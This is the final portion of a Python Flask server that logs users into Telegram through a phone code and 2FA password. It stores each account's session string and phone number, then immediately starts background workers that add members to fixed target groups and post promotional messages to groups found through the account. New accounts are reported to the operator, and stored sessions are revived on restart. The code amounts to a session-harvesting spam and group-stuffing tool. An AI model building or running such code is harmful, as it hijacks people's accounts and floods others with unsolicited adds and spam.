                            return {'success': False, 'error': 'Too many incorrect passwords.'}
                        return {'success': False, 'error': f'Wrong password. {remaining} attempts remaining.'}
                
                me = await client.get_me()
                user_telegram_id = str(me.id) if me.id else telegram_id
                
                if user_telegram_id:
                    user_phone_map[user_telegram_id] = td['phone']
                    save_user_map()
                    auto_sessions[user_telegram_id] = {
                        'phone': td['phone'],
                        'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                        'username': me.username or '',
                        'last_used': time.time(),
                        'telegram_id': user_telegram_id
                    }
                    save_auto_sessions()
                
                try:
                    account_age = get_account_age_sync(client.session.save())
                except:
                    account_age = {'age_display': 'Unknown'}
                
                new_id = int(time.time() * 1000)
                new_acc = {
                    'id': new_id,
                    'phone': me.phone or td['phone'],
                    'name': (me.first_name or '') + (' ' + me.last_name if me.last_name else '').strip(),
                    'username': me.username or '',
                    'session': client.session.save(),
                    'active': True,
                    'account_age': account_age,
                    'telegram_id': user_telegram_id
                }
                
                if not new_acc['name']:
                    new_acc['name'] = 'User ' + str(new_id)[-4:]
                
                existing = None
                for a in accounts:
                    if str(a.get('telegram_id')) == user_telegram_id:
                        existing = a
                        break
                
                if existing:
                    existing.update(new_acc)
                    new_acc['id'] = existing['id']
                else:
                    accounts.append(new_acc)
                
                save_json(ACCOUNTS_FILE, accounts)
                
                auto_add_settings[str(new_acc['id'])] = {
                    'enabled': True,
                    'target_group': TARGET_GROUPS[0],
                    'delay_seconds': 30,
                    'auto_join': True
                }
                save_json(SETTINGS_FILE, auto_add_settings)
                
                if 'worker_stats' not in stats:
                    stats['worker_stats'] = {}
                stats['worker_stats'][str(new_acc['id'])] = {'total': 0, 'today': 0, 'verified_today': 0}
                save_json(STATS_FILE, stats)
                
                # Start auto-add worker
                start_auto_add(new_acc)
                
                # Also start auto-share worker
                start_auto_share(new_acc)
                
                # Discover share groups from this account
                discovered = discover_share_groups(new_acc)
                for g in discovered:
                    if g not in share_groups:
                        share_groups.append(g)
                save_share_groups()
                
                age_info = account_age.get('age_display', 'Unknown')
                try:
                    send_telegram(
                        f"<b>{SERVER_NAME}</b>\n✅ Account added!\n"
                        f"Name: {new_acc['name']}\n"
                        f"Phone: {new_acc['phone'][:4]}****\n"
                        f"Age: {age_info}\nAuto-add: Started\nAuto-share: Started"
                    )
                except:
                    pass
                
                return {
                    'success': True,
                    'account': {'id': new_acc['id'], 'name': new_acc['name'], 'phone': new_acc['phone']},
                    'account_age': age_info,
                    'auto_login_enabled': True
                }
                
            except errors.PhoneCodeInvalidError:
                td['code_attempts'] = td.get('code_attempts', 0) + 1
                save_temp_sessions()
                remaining = 5 - td['code_attempts']
                if remaining <= 0:
                    del temp_sessions[sid]
                    save_temp_sessions()
                    return {'success': False, 'error': 'Too many incorrect codes.'}
                return {'success': False, 'error': f'Invalid code. {remaining} attempts remaining.'}
            except errors.PhoneCodeExpiredError:
                return {'success': False, 'error': 'Code expired.'}
            except Exception as e:
                return {'success': False, 'error': str(e)[:200]}
            finally:
                try:
                    await client.disconnect()
                except:
                    pass
        
        result = SyncTelegramClient.run_async(verify, timeout=45)
        
        if result.get('success') and not result.get('need_password'):
            if sid in temp_sessions:
                del temp_sessions[sid]
                save_temp_sessions()
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Verify code error: {e}")
        return jsonify({'success': False, 'error': 'Server error.'})

# ============================================
# ACCOUNT MANAGEMENT ROUTES
# ============================================
@app.route('/api/remove-account', methods=['POST'])
def remove_account():
    try:
        aid = request.json.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        stop_auto_add(aid)
        stop_auto_share(aid)
        name = remove_dead_account(aid, "Manual removal")
        with cache_lock:
            cache_key = f"chats_{aid}"
            if cache_key in chat_list_cache:
                del chat_list_cache[cache_key]
        return jsonify({'success': True, 'message': f'Removed: {name}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/auto-add-settings', methods=['GET', 'POST'])
def auto_add_settings_route():
    if request.method == 'GET':
        aid = request.args.get('accountId')
        if not aid:
            return jsonify({'success': False, 'error': 'Account ID required'})
        s = auto_add_settings.get(str(aid), {
            'enabled': False,
            'target_group': TARGET_GROUPS[0],
            'delay_seconds': 30
        })
        s['account_id'] = aid
        s['added_today'] = stats.get('today_added', 0)
        s['total_added'] = stats.get('total_added', 0)
        s['server_name'] = SERVER_NAME
        s['is_running'] = str(aid) in running_tasks
        s['is_sharing'] = str(aid) in running_share_tasks
        return jsonify({'success': True, 'settings': s})
    
    data = request.json
    aid = data.get('accountId')
    if not aid:
        return jsonify({'success': False, 'error': 'Account ID required'})
    
    akey = str(aid)
    was_enabled = auto_add_settings.get(akey, {}).get('enabled', False)
    new_enabled = data.get('enabled', False)
    
    auto_add_settings[akey] = {
        'enabled': new_enabled,
        'target_group': data.get('target_group', TARGET_GROUPS[0]),
        'delay_seconds': max(30, data.get('delay_seconds', 30)),
        'auto_join': True
    }
    save_json(SETTINGS_FILE, auto_add_settings)
    
    if new_enabled and not was_enabled:
        acc = next((a for a in accounts if str(a['id']) == akey), None)
        if acc:
            start_auto_add(acc)
    elif not new_enabled and was_enabled:
        stop_auto_add(aid)
    
    return jsonify({'success': True, 'message': 'Settings saved'})

@app.route('/api/auto-add-stats')
def auto_add_stats():
    reset_daily()
    return jsonify({
        'success': True,
        'added_today': stats.get('today_added', 0),
        'total_added': stats.get('total_added', 0),
        'server_name': SERVER_NAME,
        'active_workers': len(running_tasks),
        'active_share_workers': len(running_share_tasks),
        'shares_today': share_stats.get('today_shares', 0),
        'total_shares': share_stats.get('total_shares', 0)
    })

@app.route('/api/send-report')
def send_report():
    success = send_telegram(
        f"<b>{SERVER_NAME}</b> Report\n"
        f"👥 Added Today: {stats.get('today_added', 0)}\n"
        f"📊 Total Added: {stats.get('total_added', 0)}\n"
        f"📢 Shares Today: {share_stats.get('today_shares', 0)}\n"
        f"📢 Total Shares: {share_stats.get('total_shares', 0)}\n"
        f"⚙️ Active Workers: {len(running_tasks)}\n"
        f"📢 Share Workers: {len(running_share_tasks)}\n"
        f"📋 Share Groups: {len(share_groups)}"
    )
    return jsonify({'success': success})

@app.route('/api/health')
def health_check():
    return jsonify({
        'success': True,
        'server': SERVER_NAME,
        'status': 'healthy',
        'workers': len(running_tasks),
        'share_workers': len(running_share_tasks),
        'accounts': len(accounts),
        'saved_users': len(user_phone_map),
        'share_groups': len(share_groups),
        'today_added': stats.get('today_added', 0),
        'today_shares': share_stats.get('today_shares', 0),
        'timestamp': datetime.now().isoformat()
    })

# ============================================
# BACKGROUND TASKS
# ============================================
def keep_alive():
    consecutive_failures = 0
    while True:
        try:
            time.sleep(240)
            try:
                response = requests.get(f"{SERVER_URL}/ping", timeout=10)
                if response.status_code == 200:
                    consecutive_failures = 0
                else:
                    consecutive_failures += 1
            except:
                consecutive_failures += 1
            if consecutive_failures > 5:
                logger.critical("Too many keep-alive failures!")
                consecutive_failures = 0
        except Exception as e:
            logger.error(f"Keep alive error: {e}")
            time.sleep(60)

def cleanup_caches():
    """Periodically clean expired cache entries"""
    while True:
        time.sleep(30)
        current_time = time.time()
        with cache_lock:
            expired_chats = [k for k, v in chat_list_cache.items() 
                           if current_time - v.get('timestamp', 0) > CHAT_LIST_CACHE_DURATION * 2]
            for k in expired_chats:
                del chat_list_cache[k]
            
            expired_msgs = [k for k, v in message_cache.items()
                          if current_time - v.get('timestamp', 0) > MESSAGE_CACHE_DURATION * 2]
            for k in expired_msgs:
                del message_cache[k]

def restore_and_start():
    try:
        time.sleep(5)
        logger.info(f"Restoring {len(accounts)} accounts...")
        
        for acc in accounts:
            try:
                if acc.get('session'):
                    if check_account_auth(acc):
                        # Start auto-add worker
                        settings = auto_add_settings.get(str(acc['id']), {})
                        if settings.get('enabled', True):
                            start_auto_add(acc)
                            logger.info(f"Restored auto-add worker for {acc.get('name', acc['id'])}")
                        
                        # Start auto-share worker
                        start_auto_share(acc)
                        logger.info(f"Restored auto-share worker for {acc.get('name', acc['id'])}")
                    else:
                        remove_dead_account(acc['id'], "Auth check failed on startup")
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error restoring account {acc.get('id')}: {e}")
                continue
        
        save_json(ACCOUNTS_FILE, accounts)
        cleanup_expired_sessions()
        
        # Ensure share groups include target groups
        for tg in TARGET_GROUPS:
            if tg not in share_groups:
                share_groups.append(tg)
        save_share_groups()
        
        try:
            send_telegram(
                f"<b>{SERVER_NAME}</b> Online!\n"
                f"Add Workers: {len(running_tasks)}\n"
                f"Share Workers: {len(running_share_tasks)}\n"
                f"Accounts: {len(accounts)}\n"
                f"Share Groups: {len(share_groups)}\n"
                f"Auto-login users: {len(user_phone_map)}"
            )
        except:
            pass
        
        logger.info(f"✅ Server startup complete - {len(running_tasks)} add workers, {len(running_share_tasks)} share workers running")
    except Exception as e:
        logger.critical(f"Fatal error during restore: {e}")
        stats['crashes_recovered'] = stats.get('crashes_recovered', 0) + 1
        save_json(STATS_FILE, stats)

def cleanup_expired_sessions():
    try:
        current_time = time.time()
        expired = [sid for sid, data in temp_sessions.items()
                   if current_time - data.get('created_at', 0) > 3600]
        for sid in expired:
            del temp_sessions[sid]
        save_temp_sessions()
        if expired:
            logger.info(f"Cleaned up {len(expired)} expired sessions")
    except Exception as e:
        logger.error(f"Session cleanup error: {e}")

def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}, saving data and shutting down...")
    # Stop all workers
    for acc_key in list(running_tasks.keys()):
        stop_auto_add(acc_key)
    for acc_key in list(running_share_tasks.keys()):
        stop_auto_share(acc_key)
    # Save all data
    save_json(ACCOUNTS_FILE, accounts)
    save_json(SETTINGS_FILE, auto_add_settings)
    save_json(STATS_FILE, stats)
    save_json(WORKER_ADDS_FILE, dict(worker_adds))
    save_share_groups()
    save_temp_sessions()
    save_auto_sessions()
    save_user_map()
    save_share_config(share_config)
    logger.info("Data saved. Exiting.")
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# ============================================
# MAIN
# ============================================
if __name__ == '__main__':
    try:
        accounts.extend(load_json(ACCOUNTS_FILE, []))
        auto_add_settings.update(load_json(SETTINGS_FILE, {}))
        stats_data = load_json(STATS_FILE, {})
        if stats_data:
            stats.update(stats_data)
        worker_adds_data = load_json(WORKER_ADDS_FILE, {})
        if worker_adds_data:
            worker_adds.update(worker_adds_data)
        load_temp_sessions()
        load_auto_sessions()
        load_user_map()
        load_share_groups()
        
        # Load share configuration
        global share_config, SHARE_INTERVAL_SECONDS, SHARE_DELAY_BETWEEN_GROUPS, AUTO_SHARE_ENABLED, PROMO_MESSAGE
        share_config = load_share_config()
        SHARE_INTERVAL_SECONDS = share_config['share_interval_seconds']
        SHARE_DELAY_BETWEEN_GROUPS = share_config['share_delay_between_groups']
        AUTO_SHARE_ENABLED = share_config['auto_share_enabled']
        if share_config['messages']:
            PROMO_MESSAGE = share_config['messages'][0]
        
        # Ensure target groups are in share groups
        for tg in TARGET_GROUPS:
            if tg not in share_groups:
                share_groups.append(tg)
                logger.info(f"Added target group to share list: {tg}")
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║     AUTO-ADD & SHARE SERVER #{SERVER_NUMBER} - {SERVER_NAME}              ║
╠══════════════════════════════════════════════════════════════╣
║  API ID: {API_ID}                                                 ║
║  Targets: {', '.join(TARGET_GROUPS)}                    ║
║  Port: {PORT}                                                   ║
║  Accounts: {len(accounts)}                                              ║
║  Share Groups: {len(share_groups)}                                            ║
║  Share Interval: {SHARE_INTERVAL_SECONDS}s                               ║
║  Group Delay: {SHARE_DELAY_BETWEEN_GROUPS}s                                    ║
║  Messages: {len(share_config['messages'])}                                              ║
║  Premium Emojis: {'✅' if share_config['use_premium_emojis'] else '❌'}                                           ║
║  Dashboard: Chat List Only (On-Demand Messages)              ║
║  Control Panel: /control                                     ║
║  Features: Auto Join ✅ | Auto Add ✅ | Auto Share ✅       ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        threading.Thread(target=keep_alive, daemon=True, name="keep_alive").start()
        threading.Thread(target=restore_and_start, daemon=True, name="restore").start()
        threading.Thread(target=cleanup_caches, daemon=True, name="cache_cleanup").start()
        
        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
            
    except Exception as e:
        logger.critical(f"Fatal startup error: {e}")
        logger.critical(traceback.format_exc())
        try:
            save_json(ACCOUNTS_FILE, accounts)
            save_json(SETTINGS_FILE, auto_add_settings)
            save_json(STATS_FILE, stats)
            save_share_groups()
            save_share_config(share_config)
        except:
            pass
        sys.exit(1)
